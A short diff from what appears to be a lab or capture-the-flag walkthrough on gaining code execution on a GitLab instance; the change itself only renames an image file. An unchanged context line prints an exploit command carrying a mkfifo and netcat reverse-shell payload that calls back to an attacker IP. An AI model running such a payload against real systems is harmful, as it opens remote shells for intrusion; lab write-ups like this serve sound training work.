@@ -93,7 +93,7 @@ Gain remote code execution on the GitLab instance. Submit the flag in the direct
 python3 rce.py -t http://gitlab.inlanefreight.local:8081 -u lky -p password -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 7890 >/tmp/f '
 ```
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
